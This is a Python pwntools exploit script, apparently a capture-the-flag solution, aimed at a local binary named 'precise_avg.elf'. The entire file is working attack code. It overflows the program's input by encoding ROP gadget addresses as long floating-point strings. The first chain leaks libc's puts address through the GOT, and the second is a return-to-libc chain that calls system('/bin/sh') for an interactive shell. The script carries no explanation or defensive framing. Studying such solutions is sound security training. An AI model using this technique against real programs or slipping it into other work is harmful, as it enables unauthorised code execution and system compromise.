#!/usr/bin/python
from pwn import *
import struct

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-v']
p = process("./precise_avg.elf")
e = ELF("./precise_avg.elf")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

pop_rdi = 0x4009c3
main_addr = 0x4007d0

def ovf(payload) :
    global p
    p.recvuntil(": ")
    length = 35 + len(payload)
    p.sendline(str(length))

    for i in range(35) :
        p.sendline("-")

    for i in range(len(payload)) :
        format_num = "%.800f" % struct.unpack("<d", p64(payload[i]))
        p.sendline(format_num)

    p.recvuntil("Result = ")
    p.recvuntil("\n")

# Leak libc
rop = list()
rop.append(pop_rdi)
rop.append(e.got['puts'])
rop.append(e.plt['puts'])
rop.append(main_addr)
ovf(rop)
res = p.readuntil("\n")
libc_base = u64(res[:-1] + '\x00' * (9 - len(res))) - libc.symbols['puts']
print(hex(libc_base))

# ret to libc
rop = list()
rop.append(0x400958)
rop.append(pop_rdi)
rop.append(libc_base + next(libc.search('/bin/sh')))
rop.append(libc_base + libc.symbols['system'])
ovf(rop)

# gdb.attach(p)
# raw_input()

p.interactive()
